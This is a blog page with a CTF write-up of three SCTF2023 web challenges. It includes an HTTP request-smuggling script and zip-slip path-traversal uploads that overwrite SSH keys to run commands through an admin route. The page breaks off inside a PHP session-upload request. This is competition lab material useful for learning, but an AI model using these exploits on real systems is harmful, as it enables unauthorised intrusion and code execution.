@@ -1,0 +1,1472 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='SCTF2023 Web WriteUp'>
+<title>SCTF2023</title>
+
+<link rel='canonical' href='https://blog.huamang.xyz/post/sctf2023/'>
+
+<link rel="stylesheet" href="/scss/style.min.a3acb339192261971279929bada446e8966aa7224703ebfd992d05448daed96b.css"><meta property='og:title' content='SCTF2023'>
+<meta property='og:description' content='SCTF2023 Web WriteUp'>
+<meta property='og:url' content='https://blog.huamang.xyz/post/sctf2023/'>
+<meta property='og:site_name' content='Huamang'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2023-06-19T12:22:58&#43;08:00'/><meta property='article:modified_time' content='2023-06-19T12:22:58&#43;08:00'/>
+<meta name="twitter:title" content="SCTF2023">
+<meta name="twitter:description" content="SCTF2023 Web WriteUp">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu2c79bb77476a4f0f53420443e9db5bfa_18691_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Huamang</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Huamang'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://blog.huamang.xyz/index.xml'
+                        target="_blank"
+                        title="RSS"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="5" cy="19" r="1" />
+  <path d="M4 4a16 16 0 0 1 16 16" />
+  <path d="M4 11a9 9 0 0 1 9 9" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/Huamang7'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/friends/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Friends</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#ezcheck1n">ezcheck1n</a></li>
+        <li><a href="#sycserver">SycServer</a></li>
+        <li><a href="#pypyp">pypyp?</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" style="background-color: #fc2828; color: #fff;">
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/sctf2023/">SCTF2023</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            SCTF2023 Web WriteUp
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jun 19, 2023</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 5 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="ezcheck1n">ezcheck1n</h2>
+<p>关注到这里海报是2022的</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230619122518962.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20230619122518962"
+	
+	
+></p>
+<p>访问这个图片的路径，不能拼接在2023之后</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230619122720137.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20230619122720137"
+	
+	
+></p>
+<p>路径加上2023的话，防问啥都会rewrite到2023.php，肯定是写了配置的</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230619122655650.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20230619122655650"
+	
+	
+></p>
+<p>这种配置的绕过最常见的思路就是走私：https://xz.aliyun.com/t/12345</p>
+<p>直接搬里面的脚本了，稍微改下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">urllib</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">def</span> <span class="nf">request_prepare</span><span class="p">():</span>
+    <span class="n">uri</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/2023/2023.php%20HTTP/1.1</span><span class="si">%0d%0a</span><span class="s1">Host:%20127.0.0.1</span><span class="si">%0d%0a</span><span class="s1">User-Agent:</span><span class="si">%20c</span><span class="s1">url/7.68.0</span><span class="si">%0d%0a%0d%0a</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;POST%20/2022.php</span><span class="si">%3F</span><span class="s1">url%3Dxx</span><span class="si">%2E</span><span class="s1">xx</span><span class="si">%2E</span><span class="s1">xx</span><span class="si">%2E</span><span class="s1">xx%3A8899&#39;</span>
+    <span class="n">req</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;&#39;GET %b HTTP/1.1</span><span class="se">\r</span><span class="s1">
+</span><span class="s1">Host: 127.0.0.1:80</span><span class="se">\r</span><span class="s1">
+</span><span class="s1"></span><span class="se">\r</span><span class="s1">
+</span><span class="s1">&#39;&#39;&#39;</span> <span class="o">%</span> <span class="n">uri</span>
+    <span class="k">return</span> <span class="n">req</span>
+
+
+<span class="k">def</span> <span class="nf">send_and_recive</span><span class="p">(</span><span class="n">req</span><span class="p">):</span>
+    <span class="n">rec</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
+    <span class="n">ip</span> <span class="o">=</span> <span class="s1">&#39;115.239.215.75&#39;</span>
+    <span class="n">port</span> <span class="o">=</span> <span class="mi">8082</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+    <span class="n">rec</span> <span class="o">+=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">rec</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">rec</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+
+
+<span class="n">req</span> <span class="o">=</span> <span class="n">request_prepare</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+<span class="c1"># print(urllib.parse.unquote(req.decode()))</span>
+<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;req.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span>
+<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">res</span> <span class="o">=</span> <span class="n">send_and_recive</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;res.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span>
+<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://tuchuang.huamang.xyz/img/image-20230619123005204.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20230619123005204"
+	
+	
+></p>
+<h2 id="sycserver">SycServer</h2>
+<p>bin文件跑起来是有路由的，根据名字也很好猜</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230619123613949.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20230619123613949"
+	
+	
+></p>
+<p>File-unarchiver路由可传zip后解压，这里测试是发现可以目录穿越的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">zipfile</span>
+
+<span class="n">z</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;test.zip&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZIP_DEFLATED</span><span class="p">)</span>
+<span class="n">z</span><span class="o">.</span><span class="n">writestr</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;../../../test.txt&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;qwe&#39;</span><span class="p">)</span>
+<span class="n">z</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://x.x.x.x:8888/file-unarchiver&#39;</span>
+<span class="n">files</span> <span class="o">=</span> <span class="p">[(</span><span class="s1">&#39;file&#39;</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;test.tar.gz&#39;</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.zip&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">),</span> <span class="s1">&#39;application/zip&#39;</span><span class="p">))]</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>fileread路由读文件没啥好说的</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230619124059227.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20230619124059227"
+	
+	
+></p>
+<p>readir这个我倒是一直没用上，主要因为他好像确实用不了。。</p>
+<p>最后的admin路由，直接跑会说找不到<code>/home/vanzy/.ssh/id_rsa</code></p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230619124238412.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20230619124238412"
+	
+	
+></p>
+<p>给服务器价格vanzy用户配置下公私钥，再跑admin路由会发现这里dial本地的2221端口连接失败了</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230619123528819.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20230619123528819"
+	
+	
+></p>
+<p>所以可以肯定这个路由是读取本地的私钥去认证本地的ssh服务</p>
+<p>所以这里攻击的思路也清晰了，就是覆盖vanzy用户的公私钥，公钥中写入command，然后访问admin路由去触发ssh连接执行command</p>
+<p>我的做法是vps上adduser 一个vanzy，<code>ssh-keygen -t rsa</code></p>
+<p>修改id_rsa.pub，添加command后，脚本一把嗦</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">zipfile</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="k">def</span> <span class="nf">fuck_priv</span><span class="p">():</span>
+    <span class="n">z</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;priv.zip&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZIP_DEFLATED</span><span class="p">)</span>
+    <span class="n">private_key</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./id_rsa&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="n">z</span><span class="o">.</span><span class="n">writestr</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;../../../../../home/vanzy/.ssh/id_rsa&#39;</span><span class="p">,</span> <span class="n">private_key</span><span class="p">)</span>
+    <span class="n">z</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="n">files</span> <span class="o">=</span> <span class="p">[(</span><span class="s1">&#39;file&#39;</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;priv.zip&#39;</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;priv.zip&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">),</span> <span class="s1">&#39;application/zip&#39;</span><span class="p">))]</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">fuck_pub</span><span class="p">():</span>
+    <span class="n">z</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;pub.zip&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZIP_DEFLATED</span><span class="p">)</span>
+    <span class="n">public_key</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./id_rsa.pub&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="n">z</span><span class="o">.</span><span class="n">writestr</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;../../../../../home/vanzy/.ssh/authorized_keys&#39;</span><span class="p">,</span> <span class="n">public_key</span><span class="p">)</span>
+    <span class="n">z</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="n">files</span> <span class="o">=</span> <span class="p">[(</span><span class="s1">&#39;file&#39;</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;pub.zip&#39;</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;pub.zip&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">),</span> <span class="s1">&#39;application/zip&#39;</span><span class="p">))]</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://119.13.91.238:8888/file-unarchiver&#39;</span>
+
+<span class="n">fuck_priv</span><span class="p">()</span>
+<span class="n">fuck_pub</span><span class="p">()</span>
+
+<span class="n">url2</span> <span class="o">=</span> <span class="s1">&#39;http://119.13.91.238:8888/admin&#39;</span>
+<span class="n">resp_2</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url2</span><span class="p">)</span>
+
+<span class="n">url1</span> <span class="o">=</span> <span class="s1">&#39;http://119.13.91.238:8888/readfile?file=/home/vanzy/huamang.txt&#39;</span>
+<span class="n">resp_1</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url1</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">resp_1</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+
+<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;rm -rf priv.zip&#39;</span><span class="p">)</span>
+<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;rm -rf pub.zip&#39;</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://tuchuang.huamang.xyz/img/image-20230619125937698.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20230619125937698"
+	
+	
+></p>
+<h2 id="pypyp">pypyp?</h2>
+<p>很折磨的一道题</p>
+<p>一进去啥都没有，就说session不存在，所以这里的解决方案是直接session_upload</p>
+<p><a class="link" href="https://xz.aliyun.com/t/9545"  target="_blank" rel="noopener"
+    >https://xz.aliyun.com/t/9545</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">POST /index.php HTTP/1.1
+Host: 115.239.215.75:8081
+Content-Length: 360
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymEq0o60RkRmbFHie
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Cookie: PHPSESSID=huamang
+Referer: http://115.239.215.75:8081/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+
